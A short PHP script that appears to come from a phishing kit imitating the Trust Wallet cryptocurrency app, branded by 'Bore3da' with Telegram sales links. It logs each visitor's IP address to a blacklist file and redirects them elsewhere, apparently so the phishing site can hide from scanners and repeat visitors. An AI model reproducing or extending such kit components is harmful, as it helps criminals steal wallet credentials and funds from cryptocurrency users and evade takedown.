<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   Trust wallet
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
 */
include "configg.php";
$ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen("cpca_assetz/vinc/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
header("location:$ExitLink");
?>

